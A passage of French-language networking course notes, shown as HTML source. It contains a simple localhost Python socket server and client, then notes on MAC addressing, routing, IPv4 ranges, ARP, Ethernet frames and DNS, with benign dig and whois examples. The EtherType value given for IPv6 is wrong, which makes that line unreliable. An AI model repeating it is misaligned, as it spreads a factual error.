&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cli_sock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tsap_cli&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;my_sock&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;accept&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;New connection from: &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tsap_cli&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;ligne&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cli_sock&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ligne&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ligne&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;cli_sock&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;my_sock&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;client-python&quot;&gt;Client python&lt;/h3&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/env python3
&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;server_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gethostbyname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'localhost'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;server_port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;6688&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;my_sock&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SOCK_STREAM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;my_sock&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;server_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;server_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;except&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Exception&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;cli_input&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;':&amp;gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cli_input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;my_sock&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendall&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cli_input&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;my_sock&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h1 id=&quot;fondamentaux&quot;&gt;Fondamentaux&lt;/h1&gt;

&lt;p&gt;Dans Ethernet, Wi-Fi, Bluetooth : chaque carte réseau possède une adresse matérielle MAC (Medium Access Control), qui est unique, sur 6 octets (48 bits). Elle est divisée en 2 parties de 3 octets, la première pour désigner le constructeur (OUI, Organization Unique Identifier), la seconde est un numéro de série définie par le constructeur. L’adresse MAC pour réaliser du broadcast est &lt;code class=&quot;highlighter-rouge&quot;&gt;ff:ff:ff:ff:ff:ff&lt;/code&gt;.&lt;/p&gt;

&lt;h3 id=&quot;routage-directe-et-indirect&quot;&gt;Routage directe et indirect&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;routage directe: les 2 machines qui communiquent font partie du même réseau, pas besoin d’intermédiaire, car elles communiquent directement&lt;/li&gt;
  &lt;li&gt;routage indirect: les 2 machines ne font pas partie du même réseau local, il faut donc passer par un intermédiaire pour sortir du réseau courant pour aller vers l’extérieur (via passerelle ou gateway)&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;routage---comment-choisir-par-quels-intermédiaires-passer-&quot;&gt;Routage -&amp;gt; comment choisir par quels intermédiaires passer ?&lt;/h3&gt;

&lt;p&gt;Les réseaux de types diffusion sont définis dans les réseaux de petites tailles comme les LAN (Local Area Network). Les réseaux point à point quant à eux sont souvent utilisés comme réseaux d’interconnexion, constitués uniquement de routeurs. La combinaison de ces 2 types de réseaux forme des WAN (Wide Area Network).&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# broadcast network&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ip &lt;span class=&quot;nb&quot;&gt;link&lt;/span&gt;
&amp;lt;BROADCAST,...&amp;gt;

&lt;span class=&quot;c&quot;&gt;# point to point network&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ip &lt;span class=&quot;nb&quot;&gt;link&lt;/span&gt;
&amp;lt;POINTTOPOINT,...&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Le datagramme va passer d’intermédiaire en intermédiaire, il fait des sauts (ou hop), décider entre routage direct et indirect. Le routage indirect peut faire le choix entre différentes adresses de routeurs, le routeur détermine l’adresse de prochain saut. On utilise les tables de routages. Chaque routeur prend une décision au mieux, best effort. Pour cela, il utilise des next hop routing algorithms.&lt;/p&gt;

&lt;p&gt;Les différents types de réseaux utilisés:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;bus&lt;/strong&gt; : n’existe plus, réseau à diffusion, collisions d’accès (protection avec collision detection et collision avoidance)&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;ring&lt;/strong&gt; : utilisé chez ISP (Internet Service Provider ou FAI) pour liaison rapide en fibre optique, système de jeton (token ring) -&amp;gt; pas de collisions&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;star&lt;/strong&gt; : matériels connectés à un noeud de connexion central&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;mesh&lt;/strong&gt; : matériel possède une ou plusieurs connexions avec les autres matériels, meilleur résistance (resilience), économie de moyens par rapport à maillage complet&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;matériel-dinterconnexion&quot;&gt;Matériel d’interconnexion&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;Repeater&lt;/strong&gt;
    &lt;ul&gt;
      &lt;li&gt;régénère, réamplifie la transmission vers tous les ports&lt;/li&gt;
      &lt;li&gt;augmenter distance&lt;/li&gt;
      &lt;li&gt;lutter contre atténuation (ex: fibre sous-marine)&lt;/li&gt;
      &lt;li&gt;même domaine de diffusion&lt;/li&gt;
      &lt;li&gt;même domaine de collision&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Hub&lt;/strong&gt;
    &lt;ul&gt;
      &lt;li&gt;répéteur multiports&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Bridge&lt;/strong&gt;
    &lt;ul&gt;
      &lt;li&gt;relaie trame d’un domaine de collision à un autre, si l’émetteur et le destinataire sont dans deux sous-domaines différents (1 domaine par port)&lt;/li&gt;
      &lt;li&gt;apprend le sous-domaine où chaque hôte est localisé grâce à son @mac&lt;/li&gt;
      &lt;li&gt;si @mac src. et @mac dest. sont derrières le même port, alors ne forward pas&lt;/li&gt;
      &lt;li&gt;même domaine de diffusion&lt;/li&gt;
      &lt;li&gt;divise domaine de collision en sous-domaines&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Switch&lt;/strong&gt;
    &lt;ul&gt;
      &lt;li&gt;bridge multiports, plus rapide et performant&lt;/li&gt;
      &lt;li&gt;même domaine de diffusion&lt;/li&gt;
      &lt;li&gt;1 port = 1 domaine de collision&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;gouvernance-dinternet&quot;&gt;Gouvernance d’internet&lt;/h3&gt;

&lt;p&gt;Organismes chargés de la gestion des adresses et des noms de domaines :&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;AfriNIC&lt;/strong&gt; (Afrique)&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;APNIC&lt;/strong&gt; (Asie, Pacifique)&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;ARIN&lt;/strong&gt; (Amérique du Nord)&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;LACNIC&lt;/strong&gt; (Amérique dur Sud)&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;RIPE NCC&lt;/strong&gt; (Europe, Moyen-Orient)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Les organismes chargés d’allouer les adresses sont des RIRs, Regional Internet Registries.&lt;/p&gt;

&lt;p&gt;Registrar : bureau d’enregistrement, permet dépôt de noms de domaines internet.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;GIP Renater : Groupement d’intérêt public, réseau de la recherche en grande, réseau National de télécommunication pour le Technologie de l’Enseignement et le Recherche.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;adresses-ipv4&quot;&gt;Adresses IPv4&lt;/h3&gt;

&lt;p&gt;Chaque routeur et machine d’un réseau doivent posséder une adresse IP.&lt;/p&gt;

&lt;p&gt;(les classes : le 0 se fait doubler par des 1 à gauche)&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Adresse&lt;/th&gt;
      &lt;th&gt;Classe&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;0.....&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;A&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;10....&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;B&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;110...&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;C&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;1110..&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;D (multicast)&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;blockquote&gt;
  &lt;p&gt;Classe A sont peux utilisées : &lt;code class=&quot;highlighter-rouge&quot;&gt;3.0.0.0/8&lt;/code&gt;AS80 General Electric Company.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;adresses-ip-réservées-pour-des-usages-particuliers&quot;&gt;Adresses IP réservées pour des usages particuliers&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;224.0.0.0/4&lt;/code&gt;: multicast&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;127.X.Y.Z&lt;/code&gt;: loopback&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;0.0.0.0&lt;/code&gt;: processus d’amorçage (BOOTP)&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;255.255.255.255&lt;/code&gt;: broadcast&lt;/li&gt;
  &lt;li&gt;private addresses:
    &lt;ul&gt;
      &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;10.0.0.0/8&lt;/code&gt;&lt;/li&gt;
      &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;172.16.0.0/12&lt;/code&gt;&lt;/li&gt;
      &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;192.168.0.0/16&lt;/code&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;APIPA (Automatic Private Internet Protocol Addressiong)
    &lt;ul&gt;
      &lt;li&gt;lorsqu’il n’y a pas de DHCP&lt;/li&gt;
      &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;169.254.0.0/16&lt;/code&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Réseaux normalement non routés, ni diffusés dans BGP, sauf que…&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;whois &lt;span class=&quot;nt&quot;&gt;-h&lt;/span&gt; rischois.ripe.net 192.168.0.0
route:        192.0.0.0/3
origin:       AS3303
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;arp&quot;&gt;ARP&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;Address Resolution Protocol&lt;/li&gt;
  &lt;li&gt;correspondance entre une @IP et une @MAC&lt;/li&gt;
  &lt;li&gt;avant d’envoyer un paquet IP, il faut connaître adresse physique MAC, sinon on utilise ARP pour l’avoir&lt;/li&gt;
  &lt;li&gt;ARP Request et ARP Reply&lt;/li&gt;
  &lt;li&gt;ARP ne sert quand dans les réseaux locaux !&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;rarp-obsoléte&quot;&gt;RARP (obsoléte)&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;Reverse Address Resolution Protocol&lt;/li&gt;
  &lt;li&gt;machine sans adresse IP envoie RARP pour en obtenir une&lt;/li&gt;
  &lt;li&gt;utilisé pour amorcer station sans disque, ou une imprimante, …&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;trame-ethernet&quot;&gt;Trame Ethernet&lt;/h3&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;@MAC dst.&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;@MAC src.&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;EtherType&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;Data&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;Padding&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;FCS&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;6 octets&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;6 octets&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;2 octets&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;0 à 1500 octets&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;0 à 46 octets&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;4 octets&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;ul&gt;
  &lt;li&gt;EtherType :
    &lt;ul&gt;
      &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;0x0800&lt;/code&gt; -&amp;gt; IPv4&lt;/li&gt;
      &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;0x08DD&lt;/code&gt; -&amp;gt; IPv6&lt;/li&gt;
      &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;0x0806&lt;/code&gt; -&amp;gt; ARP&lt;/li&gt;
      &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;0x8100&lt;/code&gt; -&amp;gt; VLAN&lt;/li&gt;
      &lt;li&gt;…&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Data + éventuellement bourrage si len(DATA) &amp;lt; 46 octets&lt;/li&gt;
  &lt;li&gt;FCS : Frame Check Sequence ou Checksum, si faux, alors non transmise au système d’exploitation&lt;/li&gt;
  &lt;li&gt;trame de 64 à 1518 octets&lt;/li&gt;
  &lt;li&gt;1 trame = 1 paquets IP (encapsulation)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Modification malveillante de la table ARP:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;ARP Spoofing (usurpation d’identité)&lt;/li&gt;
  &lt;li&gt;ARP Cache Poisoning (insertion d’association erronée)&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;dns-domain-name-server--principe-de-délégation&quot;&gt;DNS, Domain Name Server : Principe de délégation&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;système distribué mondial, utilise la délégation de domaines&lt;/li&gt;
  &lt;li&gt;tout domaine est associé à une responsabilité administrative (organisation)
    &lt;ul&gt;
      &lt;li&gt;découper le domaine en sous-domaines&lt;/li&gt;
      &lt;li&gt;déléguer les sous domaines à d’autres organisations (arbre avec racine le &lt;code class=&quot;highlighter-rouge&quot;&gt;.&lt;/code&gt; ensuite &lt;code class=&quot;highlighter-rouge&quot;&gt;fr&lt;/code&gt; ou &lt;code class=&quot;highlighter-rouge&quot;&gt;com&lt;/code&gt;, ensuite &lt;code class=&quot;highlighter-rouge&quot;&gt;unilim&lt;/code&gt; ou &lt;code class=&quot;highlighter-rouge&quot;&gt;amazon&lt;/code&gt;)&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;whois unilim.fr
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Un serveur de nom a autorité administrative sur une zone (ex: &lt;code class=&quot;highlighter-rouge&quot;&gt;.fr&lt;/code&gt; ou &lt;code class=&quot;highlighter-rouge&quot;&gt;amazon.fr&lt;/code&gt;).&lt;/p&gt;

&lt;h3 id=&quot;fonctionnement-du-dns&quot;&gt;Fonctionnement du DNS&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;application utilise nom de domaine (ex: &lt;code class=&quot;highlighter-rouge&quot;&gt;bonjour.fr&lt;/code&gt;)&lt;/li&gt;
  &lt;li&gt;application demande la traduction du nom de domaine auprès d’un serveur de nom (DNS), c’est la “résolution de nom” ou “name resolver”
    &lt;ul&gt;
      &lt;li&gt;s’il fait autorité sur le domaine demandé
        &lt;ul&gt;
          &lt;li&gt;et qu’une association est trouvée entre le domaine et une IP, il renvoi l’IP&lt;/li&gt;
          &lt;li&gt;si pas d’association, pas de réponse (la machine n’existe pas)&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;s’il ne fait pas autorité, le serveur de nom interroge d’autres serveurs de nom (du plus grand suffixe commun) pour trouver, puis la mettre dans son cache une certaine durée et répondre&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Sur les machines, le “resolver” est le processus qui s’occupe de réaliser la traduction.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# DNS requets&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;dig +trace @164.81.1.5 www.google.fr
&lt;span class=&quot;c&quot;&gt;# @164.81.1.5: use this specific DNS server&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# request to root servers (&quot;.&quot;), then &quot;.com&quot;, then &quot;google.com&quot;, and finally &quot;www.google.com&quot;&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# &quot;;; Received 92 bytes from 193.0.14.129#53(k.root-server.net) in ...&quot; show us that a previous server respond us&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Les root servers sont hard codé dans le système d’exploitation.&lt;/p&gt;

&lt;h3 id=&quot;résolution-inverse&quot;&gt;Résolution inverse&lt;/h3&gt;

&lt;p&gt;Consiste à obtenir un domaine à partir d’une @IP.&lt;/p&gt;

&lt;p&gt;Ex: On tronspose &lt;code class=&quot;highlighter-rouge&quot;&gt;164.81.60.43&lt;/code&gt; avec &lt;code class=&quot;highlighter-rouge&quot;&gt;w.x.y.z&lt;/code&gt; et on renvoi &lt;code class=&quot;highlighter-rouge&quot;&gt;z.y.x.w.in-addr.arpa&lt;/code&gt;, on obtient alors &lt;code class=&quot;highlighter-rouge&quot;&gt;43.60.81.164.in-addr.arpa&lt;/code&gt;. On fait cela car la résolution de nom de domaine se fait de droite à gauche. &lt;code class=&quot;highlighter-rouge&quot;&gt;in-addr.arpa&lt;/code&gt; a 256 sous-domaines, composé eux même de 256 soud-domaines, etc…&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# reverse dns (-x) of 164.81.60.163 using the server @164.81.1.4&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;dig +short @164.81.1.4 &lt;span class=&quot;nt&quot;&gt;-x&lt;/span&gt; 164.81.60.163

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;dig +short &lt;span class=&quot;nt&quot;&gt;-x&lt;/span&gt; 8.8.8.8
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Un serveur DNS possède une base, composée d’enregistrements, appelé RR, &lt;code class=&quot;highlighter-rouge&quot;&gt;Rousource Records&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Quelques directives :&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;A&lt;/code&gt; : correspondance nom -&amp;gt; adresse IPv4&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;AAAA&lt;/code&gt; : correspondance nom -&amp;gt; adresse IPv6&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;CNAME&lt;/code&gt; : alias ou surnom&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;MX&lt;/code&gt; : Mail eXchanger, serveur de mails&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# short response&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;dig +noall +answer adel-allam.fr
adel-allam.fr.   21599   IN   A   W.X.Y.Z

&lt;span class=&quot;c&quot;&gt;# ipv6 with AAAA&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;dig +short AAAA www.renater.fr
ix1-pv-lbl-vip-194-57-3-7.renater.fr.

